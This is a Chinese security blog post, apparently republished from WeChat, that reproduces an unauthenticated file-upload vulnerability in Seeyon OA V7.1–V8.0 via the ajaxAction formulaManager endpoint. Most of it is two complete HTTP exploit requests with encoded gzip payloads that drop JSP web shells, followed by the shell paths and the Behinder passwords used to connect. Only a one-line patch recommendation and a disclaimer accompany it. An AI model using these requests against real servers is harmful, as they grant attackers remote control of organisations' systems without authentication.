@@ -1,0 +1,111 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZyPwCytO7NLUuo9rfKtgyQ)
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjf5BDGObeEfV5qmUR4mutlppXHHADxmomViabnic9nQ0zE9dL8HUfxX6nfVraobkrIKh38Fd7Iwc6cA/640?wx_fmt=jpeg)
+
+致远 OA ajaxAction formulaManager 文件上传漏洞
+
+一、漏洞描述
+
+致远 OA 是一套办公协同软件。近日，阿里云应急响应中心监控到致远 OA ajaxAction 文件上传漏洞利用代码披露。由于致远 OA 旧版本某些 ajax 接口存在未授权访问，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。
+
+二、影响版本
+
+致远 OA V8.0、V8.0SP1
+
+致远 OA V7.1、V7.1SP1
+
+三、漏洞复现
+
+exp:  
+
+```
+POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
+Host: x.x.x.x
+Content-Length: 3519
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=A8EB887774D3B4D0D8CD0584D0B9802D; loginPageURL=
+Connection: close
+
+managerMethod=validate&arguments=%1F%C2%8B%08%00%C2%94%3A%C3%BC%5F%00%C3%BFuTKs%C2%A3F%10%3E%27%C2%BF%C2%82%C3%B2Evy%23%23%10k%2B%5B%7B%C2%B0%1E%20%C2%84%C2%84%25%C2%90x%C2%A5r%C2%80%19%04%C2%83f%C2%80%C2%88%C2%B7%5C%C3%BB%C3%9Fw%009%C3%B6V%1C%2E%C3%93%C3%93t%7F%C3%93%C3%BD%C3%B5%C3%A3%C2%AF%C3%97%C3%8119%C2%93%02%C2%BB%C3%BB%26%C3%B5%07%7F2%C2%A3%2F%C3%8C%C2%9BFuI%C2%AB%19%C3%A4%7E%C2%96%0F%C3%9E%C3%95%C2%8B%3A%3D%C3%BBY%C2%86%C2%92%C2%B8%C3%BD%C2%A9%C3%A7g%14%07L%C3%AA%C3%A6%21%C3%B3%C2%9D%C2%B9%19%0E%1F%2A%C3%9Fs%C3%934%7B%C3%88%7C%C2%BFI%C3%A2%C2%87%C2%9Bo%C2%BF3%C3%BD%C3%B7%5B%C3%A4%C2%96%C3%AE%10%25%C3%83%2Du%C3%89%C3%8D3%C3%8A%C3%BD3%C2%93%C2%BE%C3%8B%1C%05%C2%88%C3%BD%C2%8A%C3%B9%C3%84%C3%AC%C2%B6%C3%85%C2%BF%C2%BF%C3%89%C3%AB%C3%A3h%18ei%7Ds%C3%B7%2F%2As%C2%8D%20%0B%7D%C2%8C%C3%9B%10%C2%B6Rz%01%C3%B3%C2%B4%C3%B1%C2%B8%09%2B%2F%C3%83%C3%9C%C2%93%C2%84%C3%8B%0Biu%2Cr%C2%97%1A%0B%C3%A6I%C2%B9%C3%A6%C3%92%10%C2%92E%01x%C2%A3X%13%C2%B5%C3%B4%C3%B4%C2%89r%18%3D%C2%97%07I%C2%8C%1D%5D%0E%201%1A%C3%80%C3%A1%C3%92%C2%8BX%C2%B4%C3%91%C3%87%C2%8D%1C%C2%8D%C2%9F%C3%9CX%C2%AD%5E%C2%88%C2%96%02bDP%C3%82%C2%9C%C2%A3%0B%C2%95mB%2CK8%07%C3%92%C2%A4%C2%81%2D%3E%119%5B%17F%C3%B4%7F%C2%B6FI%C3%96%C3%9D%C2%AD%C2%A0%C2%B0%C3%B9%C2%95%00%C2%96Z%C3%B9%C2%A9%C2%8E%C3%A2%3A%C3%A6%C2%A6P%C2%90%5Cn%C2%A3%C3%BA%1F%C3%80%3F%7Fu%24%23%C3%B2%24%C2%B1%C2%B1%2D%2D%C3%B5%C2%B8%C3%B1%C2%BD%2C%C2%A9%C2%99m%C2%A9%17Y%3C%04%C2%8E%15%C2%B2%C2%8E%29%C2%9C%403%C2%9DS%C2%9B%0B%60%C3%AB%C3%9265%0C%C3%A2%C3%9CP%16%C2%BD%C3%9D%5E%C2%9A%C2%84%14%C2%A3%C2%91%C2%A5M%C3%AA%C3%B3%C3%AA%08PY%C2%A1%C3%B2%0B%3F%C2%AA%C2%A0%C2%B9%C3%8A%5Cs%13%C3%AC%C2%B8%3A%04%C3%BC%26p%C2%9A%10%C3%B9%C2%96%C2%86e1%C2%876%C3%82%C2%8F4%3F%16Z%C2%ABB%5E%C3%B6%7Ek%C2%A2a%C2%87%C3%A0%C3%829%C3%B4%C3%98%C2%8A%24g%C2%9BY%C2%8D%C3%96%C2%A4%C3%86%1E%C2%81%C2%AC%3B%3B%3D%1E%2D%C3%B6%C2%89r%C3%9A%C3%B2%7Er%C3%8C%C3%96n%15R%0E%28%7FW%C3%9Eb5%02%04WP%C2%AA1%C2%9C%0B%7B%C2%B8%5C%C2%A5%1E%01%C2%81%7B%C2%A1%C3%BC%C3%8Ewc%C3%95%C2%94ku%1ET%C3%AA%7CsQ9%119H%7E%04%C2%9Cq%C3%A9j%C2%80%C2%84%0AZ%C2%9Ai%C2%9B%C3%B5%C3%88%C3%91%03%04u9s%C2%9B%C3%93%C3%A3%C2%8E%C3%83%C2%95%C3%9B%C3%A78y%C2%93%C3%97%04b%C2%B8%C3%80%C2%B4%C2%AEZ%C3%A8%11%15%2B%C2%B3%C3%95T36H%C3%99%C3%A7%C3%91%C2%9A%C3%A6%C3%A0Z%C2%BBd%C2%83%C3%AA%C3%82%C2%B1%40p%C3%A0%0C%1A%C2%93%C3%81%C3%AA%C2%9C%21%1C%C3%B8%29%C2%B6%C2%9B%20%C3%B9%C3%B0f%C3%AC%C3%BC%C3%BAf%C2%AA42R%C3%B4N%3Fk%C3%B9%02M%C2%90%C2%AE%C3%9F%C3%B0%C3%B5%C3%93%C2%A3G%0C%C2%9E%C3%96%27%C2%81R%C2%98%C2%82%C2%A6%C2%B3%C3%AB%C3%AB%C3%93%C3%9Auq%C3%BDZ%1Bev%C2%A2z%C2%90%C3%98%C2%8Dp%C3%B2X%C2%87%C3%B2%21f%C2%8A%24%60%C3%98L%2F%C3%90%1C%17%C2%9E%C2%89%2F%C3%B4%C3%9Flg%C2%A8%C2%A2%1Ai%0B%C3%8Aky%C3%B5%2B%C2%BA%C3%BE%C3%A04%C2%BC%C2%8B%0D%C3%A2%C3%90%5EU%C2%96%2B%0C%2C%03%03%7EW8%C2%9C%C3%81%1E%C2%88%C3%B1%C3%B6FAs%0C%1D%3A%C2%B4%1E9%244%C3%8E%C2%94%C3%A6%40%C3%B3%C2%87%2B%2FVY%C3%9B%14%22%C2%9A%1F%C2%8D%C3%83%C2%A8%C2%A1%29f%C2%A0%09%C2%BB%C2%9E%C3%9Eq%C2%93%02J%C3%86%18%C3%92%C3%9Ang%C2%93%C2%AE%27%01%C2%A76%C2%AE5e%3D%C3%89%60%C2%B7QU%C3%B6u%5D%C2%95%1E%C2%BF%C2%BB%7F%1Fr%26%2B%C3%A2%21A%19%18N%C2%9F%C3%B5%C3%85%C3%97%C3%B1%C3%9C%07%09%C2%A4s%0E%C2%AFg%3F%C3%A2%C2%9F%1B%C3%9D%C3%BEw%C2%AA%7B%C2%B7%C3%AB%C2%A5%C3%B7%C3%AD%2F%C2%B7W%C3%80a%7FN%C2%8B%C3%A3%C2%91%02tK%C3%A0%C3%AE%C3%8B%C3%8Da%2F%C3%BE%C3%B1%C3%B4qI%7C%5C3%C3%83%C3%AE%C2%82%C3%A3%2BD%C2%8F%C3%B7%7F%C2%B6%00%27%C2%99O%03%C3%BB%C3%B1%C2%AD%5D%C2%83T%C2%80%C3%BE%C2%91%C3%89r7G%C2%80%C2%A9%C3%AB%C3%BA%C3%B6%C3%AEu%C3%B0%C2%83%C3%AEF%C2%BA%1F%5F%C3%9B3%3F%17%C3%BE%C3%A0%C3%AF%C2%9F%C3%9EEhKV%05%00%00
+```
+
+500 说明上传成功
+
+![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf5BDGObeEfV5qmUR4mutlp1TEzMxxoUEQU5Rnp0HPicsb8iaAZ9fb1Ob3Q0RDgp7xSIPbR8sQzU14w/640?wx_fmt=png)
+
+访问异常 500:
+
+![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf5BDGObeEfV5qmUR4mutlpwHtVqOltgngTTiaJH4GnzW0VylxdDxvFasGxbKATIQO6XSvicqAKC3Vw/640?wx_fmt=png)
+
+shell：http://127.0.0.1/seeyon/txf1.jspx 密码：leishi 冰蝎 3 连接（雷石安全 exp 加密版本）
+
+![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjf5BDGObeEfV5qmUR4mutlpxlQO5fUlzfK99hOSe7nn8oiap8R9lJ7wTxRlg6LQgsIpFu1xIMAvreA/640?wx_fmt=png)
+
+互联网还存在另外的一个加密 exp  
+
+```
+POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
+Host: x.x.x.x
+Content-Length: 3519
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: JSESSIONID=A8EB887774D3B4D0D8CD0584D0B9802D; loginPageURL=
+Connection: close
+
+managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00
+```
+
+shell：http://127.0.0.1/seeyon/SeeyonUpdate1.jspx 密码：rebeyond 冰蝎 3 连接
+
+四、安全建议
+
+致远 OA 为商业软件，建议联系官方以获取最新相关补丁，以及升级至最新版本。
+
+参考：
+
+https://mp.weixin.qq.com/s/OGBP0OkVdC2bZ0lzK2ZdjA
+
+https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA
+
+https://mp.weixin.qq.com/s/OcaE2VXgmI0bXAfibz1oVA
+
+https://github.com/flywuhu/seeyonAjaxGetshell
+
+免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!
+
+转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。
+
+订阅查看更多复现文章、学习笔记
+
+thelostworld
+
+安全路上，与你并肩前行！！！！
+
+![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)
+
+个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
+
+个人简书：https://www.jianshu.com/u/bf0e38a8d400
+
+个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html
+
+个人博客园：https://www.cnblogs.com/thelostworld/
+
+FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article
+
+![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)
+
+欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)
